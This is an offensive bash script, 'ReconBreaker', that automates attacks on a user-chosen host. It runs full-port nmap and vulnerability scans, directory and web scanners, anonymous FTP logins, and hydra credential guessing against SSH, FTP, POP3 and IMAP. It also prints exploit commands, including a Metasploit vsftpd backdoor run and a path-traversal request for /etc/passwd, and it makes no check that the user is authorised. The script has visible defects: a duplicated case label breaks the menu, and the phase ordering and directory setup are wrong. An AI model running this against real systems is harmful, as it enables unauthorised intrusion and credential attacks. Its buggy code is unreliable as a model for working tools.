#!/bin/bash

# ================================
#   ReconBreaker v0.1 by h3st4k3r
# ================================

RED='\033[1;31m'
GREEN='\033[1;32m'
BLUE='\033[1;34m'
YELLOW='\033[1;33m'
NC='\033[0m'

clear
echo -e "${BLUE}"
echo "==============================="
echo "     ReconBreaker v0.1"
echo "        by h3st4k3r"
echo "==============================="
echo -e "${NC}"

read -p "Enter target IP or domain: " TARGET

# Create target structure
mkdir -p "$TARGET"/{1_recon,2_scan,3_enum,4_attacks,5_creds/fuzz}

# ------------ FASE 1: Passive Recon ------------
passive_recon() {
    echo -e "${YELLOW}[*] Starting Phase 1: Passive Recon on ${TARGET}${NC}"

    echo -e "${BLUE}[+] Running WHOIS...${NC}"
    whois $TARGET > "$TARGET/1_recon/whois.txt"

    echo -e "${BLUE}[+] Running NSLOOKUP...${NC}"
    nslookup $TARGET > "$TARGET/1_recon/nslookup.txt"

    echo -e "${BLUE}[+] Running DIG...${NC}"
    dig $TARGET ANY +noall +answer > "$TARGET/1_recon/dig.txt"

    echo -e "${GREEN}[✔] Passive recon completed. Output saved in: $TARGET/1_recon${NC}"
}

# ------------ FASE 2: Port Scanning ------------
port_scanning() {
    echo -e "${YELLOW}[*] Starting Phase 2: Port Scanning on ${TARGET}${NC}"
    
    SCAN_DIR="$TARGET/2_scan"
    FULL_SCAN="$SCAN_DIR/nmap_full.txt"
    SERVICE_SCAN="$SCAN_DIR/nmap_services.txt"

    echo -e "${BLUE}[+] Running full TCP port scan (-p-)...${NC}"
    nmap -sS -Pn -T4 -p- --min-rate=5000 $TARGET -oN "$FULL_SCAN"

    echo -e "${BLUE}[+] Extracting open ports...${NC}"
    OPEN_PORTS=$(grep -oP '^\d+/tcp\s+open' "$FULL_SCAN" | cut -d'/' -f1 | paste -sd, -)

    if [ -z "$OPEN_PORTS" ]; then
        echo -e "${RED}[!] No open ports found. Skipping service scan.${NC}"
    else
        echo -e "${BLUE}[+] Open ports found: ${OPEN_PORTS}${NC}"
        echo -e "${BLUE}[+] Running service/version detection...${NC}"
        nmap -sC -sV -p$OPEN_PORTS $TARGET -oN "$SERVICE_SCAN"
    fi

    echo -e "${GREEN}[✔] Port scanning completed. Output saved in: $SCAN_DIR${NC}"

    echo -e "${YELLOW}[*] Running CVE matching with vulners...${NC}"
    nmap -sV --script vulners -p$OPEN_PORTS $TARGET -oN "$TARGET/4_attacks/nmap_cve_match.txt"

}

# ------------ FASE 3: Service Enumeration ------------
service_enum() {
    echo -e "${YELLOW}[*] Starting Phase 3: Service Enumeration${NC}"

    ENUM_DIR="$TARGET/3_enum"
    SERVICE_FILE="$TARGET/2_scan/nmap_services.txt"

    if [ ! -f "$SERVICE_FILE" ]; then
        echo -e "${RED}[!] Service scan not found. Please run Phase 2 first.${NC}"
        return
    fi

    echo -e "${BLUE}[+] Parsing services from nmap_services.txt...${NC}"

    # HTTP/HTTPS enum with gobuster
    if grep -E "http|https" "$SERVICE_FILE" | grep -q "open"; then
        echo -e "${BLUE}[+] Web service detected. Running gobuster...${NC}"
        mkdir -p "$ENUM_DIR/web"
        gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -t 20 -o "$ENUM_DIR/web/gobuster_http.txt"
    fi

    # SMB enum with enum4linux
    if grep -E "microsoft-ds|netbios-ssn|smb" "$SERVICE_FILE" | grep -q "open"; then
        echo -e "${BLUE}[+] SMB service detected. Running enum4linux...${NC}"
        mkdir -p "$ENUM_DIR/smb"
        enum4linux-ng -A $TARGET > "$ENUM_DIR/smb/enum4linux.txt"
    fi

    # FTP enum
    if grep -q "ftp" "$SERVICE_FILE"; then
        echo -e "${BLUE}[+] FTP service detected. Running basic anonymous login test...${NC}"
        mkdir -p "$ENUM_DIR/ftp"
        echo -e "open $TARGET\nuser anonymous\npass ftp@\nls\nquit" | ftp -n > "$ENUM_DIR/ftp/ftp_anonymous_test.txt"
    fi

    echo -e "${GREEN}[✔] Service enumeration completed. Output saved in: $ENUM_DIR${NC}"
}

# ------------ FASE 4: Offensive Checks ------------
auto_attacks() {
    echo -e "${YELLOW}[*] Starting Phase 4: Offensive Checks${NC}"

    ATTACK_DIR="$TARGET/4_attacks"
    SERVICE_FILE="$TARGET/2_scan/nmap_services.txt"

    if [ ! -f "$SERVICE_FILE" ]; then
        echo -e "${RED}[!] Service scan not found. Please run Phase 2 first.${NC}"
        return
    fi

    mkdir -p "$ATTACK_DIR"

    # 4.1 Nuclei
    nuclei_scan

    # Nikto web scan
    if grep -E "http|https" "$SERVICE_FILE" | grep -q "open"; then
        echo -e "${BLUE}[+] Web service detected. Running nikto...${NC}"
        nikto -h http://$TARGET -output "$ATTACK_DIR/nikto_web.txt"
    fi

    # Searchsploit lookup
    echo -e "${BLUE}[+] Extracting service versions for searchsploit...${NC}"
    grep -E "open\s+[^ ]+\s+[0-9]*/tcp" "$SERVICE_FILE" | while read -r line; do
        SERVICE_NAME=$(echo "$line" | awk '{print $3}')
        VERSION=$(echo "$line" | cut -d ' ' -f 4-)
        if [[ ! -z "$VERSION" ]]; then
            echo -e "${YELLOW}[*] Searching exploits for $SERVICE_NAME $VERSION...${NC}"
            echo "Service: $SERVICE_NAME $VERSION" >> "$ATTACK_DIR/searchsploit_results.txt"
            searchsploit "$SERVICE_NAME $VERSION" >> "$ATTACK_DIR/searchsploit_results.txt"
            echo "------------------------------------------------" >> "$ATTACK_DIR/searchsploit_results.txt"
        fi
    done

    echo -e "${GREEN}[✔] Offensive checks completed. Output saved in: $ATTACK_DIR${NC}"
}

# ------------ FASE 4.1: Nuclei Scan ------------
nuclei_scan() {
    SERVICE_FILE="$TARGET/2_scan/nmap_services.txt"
    ATTACK_DIR="$TARGET/4_attacks"
    mkdir -p "$ATTACK_DIR"

    if ! command -v nuclei &> /dev/null; then
        echo -e "${RED}[!] Nuclei is not installed. Skipping.${NC}"
        return
    fi

    if grep -E "http|https" "$SERVICE_FILE" | grep -q "open"; then
        echo -e "${YELLOW}[*] Running Nuclei scan (high/critical CVEs)...${NC}"
        URL="http://$TARGET"
        nuclei -u "$URL" -severity high,critical -t cves/ -o "$ATTACK_DIR/nuclei_results.txt"
        echo -e "${GREEN}[✔] Nuclei results saved in: $ATTACK_DIR/nuclei_results.txt${NC}"
    else
        echo -e "${BLUE}[-] No HTTP service detected. Skipping Nuclei.${NC}"
    fi
}
# ------------ FASE 5: Fuzzing Users with Hydra ------------
user_fuzzing() {
    echo -e "${YELLOW}[*] Starting user fuzzing on detected services...${NC}"
    FUZZ_DIR="$TARGET/5_creds/fuzz"
    mkdir -p "$FUZZ_DIR"

    USERLIST="/usr/share/wordlists/nmap.lst"

    # SSH
    if grep -q "ssh" "$TARGET/2_scan/nmap_services.txt"; then
        echo -e "${BLUE}[+] SSH detected. Fuzzing users...${NC}"
        hydra -L "$USERLIST" -p test123 ssh://$TARGET -o "$FUZZ_DIR/ssh_user_fuzz.txt"
    fi

    # FTP
    if grep -q "ftp" "$TARGET/2_scan/nmap_services.txt"; then
        echo -e "${BLUE}[+] FTP detected. Fuzzing users...${NC}"
        hydra -L "$USERLIST" -p ftp ftp://$TARGET -o "$FUZZ_DIR/ftp_user_fuzz.txt"
    fi

    # POP3
    if grep -q "pop3" "$TARGET/2_scan/nmap_services.txt"; then
        echo -e "${BLUE}[+] POP3 detected. Fuzzing users...${NC}"
        hydra -L "$USERLIST" -p pop pop3://$TARGET -o "$FUZZ_DIR/pop3_user_fuzz.txt"
    fi

    # IMAP
    if grep -q "imap" "$TARGET/2_scan/nmap_services.txt"; then
        echo -e "${BLUE}[+] IMAP detected. Fuzzing users...${NC}"
        hydra -L "$USERLIST" -p imap imap://$TARGET -o "$FUZZ_DIR/imap_user_fuzz.txt"
    fi

    echo -e "${GREEN}[✔] Fuzzing completed. Results saved in $FUZZ_DIR${NC}"
}

# ------------ SMART AUTO MODE ------------
smart_auto_mode() {
    echo -e "${YELLOW}[*] Starting SMART AUTO MODE based on detected services${NC}"

    passive_recon
    port_scanning

    SERVICE_FILE="$TARGET/2_scan/nmap_services.txt"
    ENUM_DIR="$TARGET/3_enum"
    ATTACK_DIR="$TARGET/4_attacks"
    FUZZ_DIR="$TARGET/5_creds/fuzz"
    mkdir -p "$ENUM_DIR" "$ATTACK_DIR" "$FUZZ_DIR"

    if [ ! -f "$SERVICE_FILE" ]; then
        echo -e "${RED}[!] No service file found. Skipping conditional logic.${NC}"
        return
    fi

    echo -e "${BLUE}[+] Parsing detected services...${NC}"

    # --- FTP ---
    if grep -q "ftp" "$SERVICE_FILE"; then
        echo -e "${BLUE}[+] FTP detected.${NC}"
        echo -e "open $TARGET\nuser anonymous\npass ftp@\nls\nquit" | ftp -n > "$ENUM_DIR/ftp/ftp_anonymous_test.txt"
        hydra -L /usr/share/wordlists/nmap.lst -p ftp ftp://$TARGET -o "$FUZZ_DIR/ftp_user_fuzz.txt"
    fi

    # --- SMB ---
    if grep -E "microsoft-ds|netbios-ssn|smb" "$SERVICE_FILE" | grep -q "open"; then
        echo -e "${BLUE}[+] SMB detected.${NC}"
        enum4linux-ng -A $TARGET > "$ENUM_DIR/smb/enum4linux.txt"
    fi

    # --- HTTP / HTTPS ---
    if grep -E "http|https" "$SERVICE_FILE" | grep -q "open"; then
        echo -e "${BLUE}[+] HTTP(S) detected.${NC}"
        mkdir -p "$ENUM_DIR/web"
        nuclei_scan
        gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -t 20 -o "$ENUM_DIR/web/gobuster_http.txt"
        whatweb -v http://$TARGET > "$ENUM_DIR/web/whatweb.txt"
        curl -I http://$TARGET > "$ENUM_DIR/web/headers.txt"
        nikto -h http://$TARGET -output "$ATTACK_DIR/nikto_web.txt"
    fi

    # --- SSH ---
    if grep -q "ssh" "$SERVICE_FILE"; then
        echo -e "${BLUE}[+] SSH detected. Running user fuzz...${NC}"
        hydra -L /usr/share/wordlists/nmap.lst -p test123 ssh://$TARGET -o "$FUZZ_DIR/ssh_user_fuzz.txt"
    fi

    # --- POP3 / IMAP ---
    for proto in pop3 imap; do
        if grep -q "$proto" "$SERVICE_FILE"; then
            echo -e "${BLUE}[+] $proto detected. Running user fuzz...${NC}"
            hydra -L /usr/share/wordlists/nmap.lst -p $proto ${proto}://$TARGET -o "$FUZZ_DIR/${proto}_user_fuzz.txt"
        fi
    done

    # --- CVE Matching ---
    echo -e "${YELLOW}[*] Running CVE matching with vulners...${NC}"
    OPEN_PORTS=$(grep -oP '^\d+/tcp\s+open' "$TARGET/2_scan/nmap_full.txt" | cut -d'/' -f1 | paste -sd, -)
    nmap -sV --script vulners -p$OPEN_PORTS $TARGET -oN "$ATTACK_DIR/nmap_cve_match.txt"
    
    echo -e "${GREEN}[✔] SMART AUTO MODE completed for $TARGET${NC}"
}

# ------------ EXPLOIT LAUNCH HELPER ------------
exploit_helper() {
    echo -e "${YELLOW}[*] Starting Exploit Launch Helper for ${TARGET}${NC}"
    echo -e "${BLUE}[*] Analyzing findings and suggesting possible exploits...${NC}"

    SERVICE_FILE="$TARGET/2_scan/nmap_services.txt"
    VULNERS_FILE="$TARGET/4_attacks/nmap_cve_match.txt"
    SEARCHSPLOIT_FILE="$TARGET/4_attacks/searchsploit_results.txt"
    NUCLEI_FILE="$TARGET/4_attacks/nuclei_results.txt"

    # FTP exploits
    if grep -q "vsftpd 2.3.4" "$SERVICE_FILE"; then
        echo -e "${GREEN}[!] FTP: vsftpd 2.3.4 → Backdoor${NC}"
        echo -e "    → msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS $TARGET; run'"
    fi

    # Apache Struts
    if grep -q "Apache Struts" "$VULNERS_FILE" || grep -qi "struts" "$NUCLEI_FILE"; then
        echo -e "${GREEN}[!] Apache Struts detected → CVE-2017-5638${NC}"
        echo -e "    → python3 exploit.py --url http://$TARGET"
    fi

    # LFI
    if grep -qi "Local File Inclusion" "$NUCLEI_FILE"; then
        echo -e "${GREEN}[!] LFI vulnerability found${NC}"
        echo -e "    → curl http://$TARGET/index.php?page=../../../../etc/passwd"
    fi

    # RCE
    if grep -qi "Remote Code Execution" "$NUCLEI_FILE"; then
        echo -e "${GREEN}[!] Possible RCE detected via nuclei${NC}"
        echo -e "    → Try command injection payloads manually"
    fi

    # Wordpress
    if grep -qi "wordpress" "$TARGET/3_enum/web/whatweb.txt"; then
        echo -e "${GREEN}[!] WordPress detected${NC}"
        echo -e "    → wpscan --url http://$TARGET --enumerate u,vp,vt"
    fi

    # PHPMyAdmin
    if grep -qi "phpmyadmin" "$TARGET/3_enum/web/whatweb.txt"; then
        echo -e "${GREEN}[!] phpMyAdmin detected${NC}"
        echo -e "    → Try default creds or SQL injection"
    fi

    # Joomla
    if grep -qi "joomla" "$TARGET/3_enum/web/whatweb.txt"; then
        echo -e "${GREEN}[!] Joomla detected${NC}"
        echo -e "    → searchsploit joomla | tee -a $SEARCHSPLOIT_FILE"
    fi

    # SMB anonymous
    if grep -qi "SMB" "$SERVICE_FILE" && grep -q "anonymous" "$TARGET/3_enum/smb/enum4linux.txt"; then
        echo -e "${GREEN}[!] SMB allows anonymous access${NC}"
        echo -e "    → smbclient -L \\$TARGET -N"
    fi

    # RDP weak auth
    if grep -qi "ms-wbt-server" "$SERVICE_FILE"; then
        echo -e "${GREEN}[!] RDP detected${NC}"
        echo -e "    → xfreerdp /u:USER /p:PASS /v:$TARGET"
    fi

    # Default web admin panels
    for panel in "admin" "login" "phpmyadmin" "webmin"; do
        if grep -qi "$panel" "$TARGET/3_enum/web/gobuster_http.txt"; then
            echo -e "${GREEN}[!] Web panel found: $panel${NC}"
            echo -e "    → Try default creds or Hydra"
        fi
    done

    # CVEs via vulners
    if grep -q "CVE" "$VULNERS_FILE"; then
        echo -e "${YELLOW}[*] CVEs found in vulners scan:${NC}"
        grep "CVE" "$VULNERS_FILE" | cut -d ' ' -f 1 | sort -u | while read CVE; do
            echo -e "    → $CVE → searchsploit $CVE"
        done
    fi

    echo -e "${BLUE}[i] Also review manually: $SEARCHSPLOIT_FILE, $NUCLEI_FILE, $VULNERS_FILE${NC}"
    echo -e "${GREEN}[✔] Exploit suggestions complete.${NC}"
}



# ------------ MAIN MENU LOOP ------------
while true; do
    echo
    echo -e "${BLUE}==== Select a phase to run ====${NC}"
    echo "1. Passive Recon"
    echo "2. Port Scanning"
    echo "3. Service Enumeration"
    echo "4. Automated Attacks"
    echo "5. User fuzzing"
    echo "6. Run ALL phases"
    echo "----------------------------------"
    echo "7. Smart Auto Mode (recommended)"
    echo "----------------------------------"
    echo "8. Exploit Launch Helper (suggestions)"
    echo "----------------------------------"
    echo "0. Exit"
    read -p "Choice: " OPTION

    case $OPTION in
        1) passive_recon ;;
        2) port_scanning ;;
        3) service_enum ;;
        4) auto_attacks ;;
        5) user_fuzzing ;;
        6)
            user_fuzzing
            passive_recon
            port_scanning
            service_enum
            auto_attacks
            ;;
        7) smart_auto_mode ;;
        8) 8) exploit_helper ;;
        0)
            echo -e "${RED}Exiting ReconBreaker...${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}[!] Invalid option${NC}"
            ;;
    esac
done
